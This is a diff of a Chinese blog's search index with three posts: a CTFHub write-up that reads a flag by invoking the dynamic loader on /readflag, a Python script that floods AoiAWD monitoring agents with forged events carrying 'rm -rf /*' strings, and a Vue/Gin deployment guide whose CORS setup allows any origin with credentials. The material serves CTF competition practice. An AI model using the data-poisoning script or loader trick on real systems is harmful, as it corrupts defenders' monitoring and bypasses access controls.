-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
-<p>vue 中设置的 router 会被 build 进 js</p>
-<p>通过 js 获取 url 来切换页面</p>
-<p>对未使用 embed 的方法同理，参考代码自行设置</p>
-<h3 id="embed"><a href="#embed" class="headerlink" title="embed"></a>embed</h3><p>对于使用<code>embed</code>的</p>
-<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
+    <title>linux动态加载</title>
+    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
 <blockquote>
-<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
+<p>都到这一题了权限应该不用讲了</p>
 </blockquote>
-<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
-<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
+<p>提示给了 shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
+<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
+
+<p>get</p>
 ]]></content>
       <categories>
-        <category>教程</category>
+        <category>web</category>
       </categories>
       <tags>
-        <tag>vue</tag>
-        <tag>gin</tag>
-        <tag>golang</tag>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
       </tags>
   </entry>
   <entry>
@@ -1346,6 +1265,87 @@
         <tag>web</tag>
         <tag>upload</tag>
         <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD反制脚本</title>
+    <url>/2024/05/untiAoi/</url>
+    <content><![CDATA[<h2 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
+<p>赛后研究了一下</p>
+<p>开发了这个反制脚本</p>
+<p>由于打点队友喜欢用 gogo</p>
+<p>所以这个脚本支持 gogo 扫描结果</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>发现后端未验证来自靶机的数据</p>
+<p>因此存在脏数据污染</p>
+<p>针对此开发脚本</p>
+<p>可向 AoiAWD 的各个数据展示页面投放脏数据</p>
+<p>包括告警页面</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>再此公布本脚本，希望下次 awd 遇见的时候别打我，谢谢 QAQ</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./ip.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line">url_list = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">    pattern = <span class="string">r&quot;tcp://(\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;:\d+)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, i, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        i = <span class="keyword">match</span>.group(<span class="number">0</span>).split(<span class="string">&quot;//&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">        i = i.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        server_address = (i, p)  <span class="comment"># 替换SERVER_IP和SERVER_PORT为实际值</span></span><br><span class="line">        data = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;ping&quot;&#125;\n&#x27;</span></span><br><span class="line">        data2 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;new_process&quot;,&quot;data&quot;:&#123;&quot;pid&quot;:&quot;114514&quot;,&quot;ppid&quot;:&quot;114514&quot;,&quot;uid&quot;:&quot;0&quot;,&quot;username&quot;:&quot;root&quot;,&quot;cmd&quot;:&quot;rm -rf /*&quot;,&quot;param&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data3 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/update/score_points&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;ZmxhZ3tDcmF6eV9UaHVydGhkYXlfdl9tZV81MH0=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data4 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;web&quot;,&quot;data&quot;:&#123;&quot;scipt&quot;:&quot;/var/www/html/rce.php&quot;,&quot;method&quot;:&quot;post&quot;,&quot;uri&quot;:&quot;127.0.0.1/rce.php&quot;,&quot;remote&quot;:&quot;127.0.0.1&quot;,&quot;buffer&quot;:&quot;&#123;\\&quot;flag\\&quot;:\\&quot;flag&#123;Crazy_Thurthday_v_me_50&#125;\\&quot;&#125;&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data5 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data6 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;pwn&quot;,&quot;data&quot;:&#123;&quot;file&quot;:&quot;catflag&quot;,&quot;type&quot;:&quot;stdin&quot;,&quot;pid&quot;:&quot;123&quot;,&quot;maps&quot;:&quot;su root rm -rf /*&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        data7 = <span class="string">&#x27;&#123;&quot;type&quot;:&quot;file&quot;,&quot;data&quot;:&#123;&quot;path&quot;:&quot;/114514&quot;,&quot;mode&quot;:33188,&quot;event&quot;:256,&quot;size&quot;:114514,&quot;content&quot;:&quot;c3Ugcm9vdCBybSAtcmYgLyo=&quot;&#125;&#125;\n&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> sock:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sock.settimeout(<span class="number">1</span>)</span><br><span class="line">                sock.connect(server_address)</span><br><span class="line">                sock.sendall(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                tmp = sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;pong&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(tmp):</span><br><span class="line">                    sock.sendall(data2.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data3.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data4.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">                        sock.sendall(data7.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data6.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    sock.sendall(data5.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;i&#125;</span>\n&quot;</span>)</span><br><span class="line">                    sock.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;\n[-] --------------------------------<span class="subst">&#123;i&#125;</span>-------------------------------------\n&quot;</span></span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h3><p>由于分析了各个 AWD 防御工具(Aoi、wathbird 等)</p>
+<p>决定模仿 aoi、并借鉴其他各个工具</p>
+<p>重写一个基于 go(gin 或 iris 大概率会用 gin)的 AWD 监测防御系统</p>
+<p>但是目前没有时间开发(<del>别问，问就是鸽</del>)</p>
+<p><del>预计会在 2025 年 5 月问世</del> ：)</p>
+<p>如果师傅们有留存的各个 AWD 比赛的流量等数据</p>
+<p>以及分析了解过官方 check 机制的师傅</p>
+<p>以及有大量参加 AWD 经验的大师傅</p>
+<p>欢迎联系本菜鸡</p>
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>AoiAWD</tag>
+        <tag>反制脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vue gin合并部署(完美方案)</title>
+    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
+<p>二者合并部署的教程非常少，且各有各的问题</p>
+<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
+<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>使用 axios 时进行如下配置</p>
+<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
+<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
+<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
+<p>同时</p>
+<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
+<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>
+
+<p>方便一部送到位</p>
+<h2 id="gin"><a href="#gin" class="headerlink" title="gin"></a>gin</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">文件夹 <span class="selector-tag">PATH</span> 列表</span><br><span class="line">卷序列号为 AE05-<span class="number">588</span>D</span><br><span class="line">C:.</span><br><span class="line">├─main.go</span><br><span class="line">├─其他</span><br><span class="line">└─vue <span class="comment">/* 可改 */</span></span><br><span class="line">    └─assets</span><br></pre></td></tr></table></figure>
+
+<p>main.go 添加 embed 和路由</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go:embed  vue/index.html</span></span><br><span class="line"><span class="keyword">var</span> indexHtml []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//go:embed  vue/*</span></span><br><span class="line"><span class="keyword">var</span> vue embed.FS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 其他设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置允许跨域 方便dev联调</span></span><br><span class="line">	r.Use(cors.New(cors.Config&#123;</span><br><span class="line">		AllowOrigins:     []<span class="type">string</span>&#123;<span class="string">&quot;*&quot;</span>&#125;, <span class="comment">// 允许的域名</span></span><br><span class="line">		AllowMethods:     []<span class="type">string</span>&#123;<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>&#125;,</span><br><span class="line">		AllowHeaders:     []<span class="type">string</span>&#123;<span class="string">&quot;Origin&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>&#125;,</span><br><span class="line">		AllowCredentials: <span class="literal">true</span>,</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 配置vue路由</span></span><br><span class="line">	assets, _ := fs.Sub(vue, <span class="string">&quot;vue/assets&quot;</span>)</span><br><span class="line">	r.StaticFS(<span class="string">&quot;/assets&quot;</span>, http.FS(assets))</span><br><span class="line">	icon, _ := fs.ReadFile(vue, <span class="string">&quot;vue/favicon.ico&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/favicon.ico&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123; c.Data(<span class="number">200</span>, <span class="string">&quot;image/x-icon&quot;</span>, icon) &#125;)</span><br><span class="line">	r.NoRoute(<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.Data(<span class="number">200</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, indexHtml)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他路由</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>r.NoRoute</code>将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等</p>
+<p>vue 中设置的 router 会被 build 进 js</p>
+<p>通过 js 获取 url 来切换页面</p>
+<p>对未使用 embed 的方法同理，参考代码自行设置</p>
+<h3 id="embed"><a href="#embed" class="headerlink" title="embed"></a>embed</h3><p>对于使用<code>embed</code>的</p>
+<p>由于<code>StaticFS</code>和<code>embed</code>的底层代码逻辑</p>
+<blockquote>
+<p>在前端根目录的文件一般不多，这里只有<code>index.html</code>和 icon 文件</p>
+</blockquote>
+<p>可通过单独获取、或通过<code>fs.ReadFile</code>获取，分别参考<code>index.html</code>和<code>favicon.ico</code></p>
+<p>对于前端其他文件，需要通过<code>fs.Sub</code>下移到对应目录后才能通过<code>r.StaticFS(&quot;/assets&quot;, http.FS(assets))</code>配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 等文件不存在的，页面无法加载等情况</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>vue</tag>
+        <tag>gin</tag>
+        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
